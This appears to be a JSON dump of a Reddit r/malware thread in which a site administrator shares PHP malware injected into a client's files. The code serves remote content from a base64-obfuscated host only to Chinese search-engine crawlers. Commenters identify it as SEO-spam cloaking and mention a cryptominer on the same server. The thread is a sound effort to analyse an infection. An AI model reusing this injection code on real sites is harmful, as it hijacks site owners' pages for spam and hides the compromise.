@@ -1,0 +1,110 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "I found a client site that was infected with this code in the headers of various php files:\n\n     &lt;?php\n     header('Content-Type:text/html;charset=gb2312');^\n     $key= $_SERVER[\"HTTP_USER_AGENT\"].$_SERVER[\"HTTP_REFERER\"];^\n     if(strpos($key,'Sogou')!== false||strpos($key,'Baidu')!==false||strpos($key,'baidu')!==false||strpos($key,'Yisou')!==false||strpos($key,'Easou')!==false||strpos($key,'360')!==false||strpos($key,'haosou')!==false||strpos($key,'Soso')!==false)\n     {\n        $host_name = \"http://\".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];\n        $file = file_get_contents(base64_decode(\"aHR0cDovL2pzY2MuanNjMTgueHl6OjgwMDAv\").base64_decode(\"L2luZGV4LnBocD9ob3N0PQ==\").$host_name.\"&amp;url=\" . $_SERVER['QUERY_STRING'] . \"&amp;domain=\" . $_SERVER['SERVER_NAME']); \n        echo $file;\n     return ;\n     }\n\nThere is some data in the code that is encrypted.\n\nThe base64_decode translates to:\n\n&gt;http://jscc. jsc18. xyz :8000//index.php?host= \n\n(put spaces to turn off the URL)\n\nSo it looks like it waits until a Chinese search engine spider hits the page, then calls a certain system to retrieve a file remotely and display it.  \n\nWhat do you think is going on here?  Obviously the remote system can send something to be executed client side, but can this allow server-side code to be executed as well?  I'm not sure.  Thoughts?  Anybody else run into this?",
+        "title": "PHP injection malware detected... triggered by Chinese search engines.",
+        "score": 22,
+        "id": "biucji",
+        "commsNum": 8,
+        "timeStamp": "2019/04/29-13:31:29",
+        "author_name": "HeyHeyRayRayBae",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 8,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/biucji/php_injection_malware_detected_triggered_by/"
+    },
+    "posts": {
+        "em5p3pl": {
+            "comment": "Looks like two separate things going on.\n\nOnce a vulnerability was found multiple actors took advantage of it (or maybe the same).. one introduced headers to various php files that do a bait-and-switch if certain search engine spiders hit the site.  And another apparently installs a Monero mining script.\n\nI still haven't figured out the entry point for either.",
+            "timeStamp": "2019/04/30-11:29:19",
+            "id": "em5p3pl",
+            "is_submitter": true,
+            "link_id": "t3_biucji",
+            "parent_id": "t1_em3zmxw",
+            "score": 2,
+            "stickied": false,
+            "author_name": "HeyHeyRayRayBae"
+        },
+        "em4skn9": {
+            "comment": "No, the server hosting the malicious files.",
+            "timeStamp": "2019/04/30-05:29:46",
+            "id": "em4skn9",
+            "is_submitter": false,
+            "link_id": "t3_biucji",
+            "parent_id": "t1_em3zmxw",
+            "score": 1,
+            "stickied": false,
+            "author_name": "tisti"
+        },
+        "em3zmxw": {
+            "comment": "I'm trying to follow those as someone with limited experience with malware. Are you saying that these guys are then trying to get the Chinese search Engine servers to mine bitcoin for them?",
+            "timeStamp": "2019/04/29-19:39:31",
+            "id": "em3zmxw",
+            "is_submitter": false,
+            "link_id": "t3_biucji",
+            "parent_id": "t1_em3grku",
+            "score": 2,
+            "stickied": false,
+            "author_name": "Crusader199"
+        },
+        "em3grku": {
+            "comment": "Thanks!  According to VirusTotal, it's a bitcoin miner.\n\na variant of Linux/CoinMiner.AP",
+            "timeStamp": "2019/04/29-15:56:14",
+            "id": "em3grku",
+            "is_submitter": true,
+            "link_id": "t3_biucji",
+            "parent_id": "t1_em3cb2w",
+            "score": 4,
+            "stickied": false,
+            "author_name": "HeyHeyRayRayBae"
+        },
+        "em3cb2w": {
+            "comment": "If it\u2019s consuming a ton of CPU it\u2019s pretty likely it\u2019s a cryptominer. Try VirusTotal for the binary, or run it through Ghidra",
+            "timeStamp": "2019/04/29-15:06:33",
+            "id": "em3cb2w",
+            "is_submitter": false,
+            "link_id": "t3_biucji",
+            "parent_id": "t1_em34zro",
+            "score": 3,
+            "stickied": false,
+            "author_name": "NovateI"
+        },
+        "em36rv1": {
+            "comment": "It's for generating SEO spam.",
+            "timeStamp": "2019/04/29-14:06:05",
+            "id": "em36rv1",
+            "is_submitter": false,
+            "link_id": "t3_biucji",
+            "parent_id": "t3_biucji",
+            "score": 1,
+            "stickied": false,
+            "author_name": "lawrenceabrams"
+        },
+        "em34zro": {
+            "comment": "The server also appears to randomly spawn a certain file that consumes huge amounts of CPU power.  I assume possibly some sort of crypto miner?\n\nIs there a place I can submit the executable Linux binary for analysis to find out what it is?   What about that URL?  It's obviously some sort of command/control system.",
+            "timeStamp": "2019/04/29-13:47:40",
+            "id": "em34zro",
+            "is_submitter": true,
+            "link_id": "t3_biucji",
+            "parent_id": "t1_em33myv",
+            "score": 2,
+            "stickied": false,
+            "author_name": "HeyHeyRayRayBae"
+        },
+        "em33myv": {
+            "comment": "Just a guess, but it might be black-hat SEO. They can make compromised pages appear to have links to the site they want to promote when those sites are loaded by search engines but otherwise have that site not appear to be compromised.",
+            "timeStamp": "2019/04/29-13:33:45",
+            "id": "em33myv",
+            "is_submitter": false,
+            "link_id": "t3_biucji",
+            "parent_id": "t3_biucji",
+            "score": 9,
+            "stickied": false,
+            "author_name": "AaronOpfer"
+        }
+    }
+}
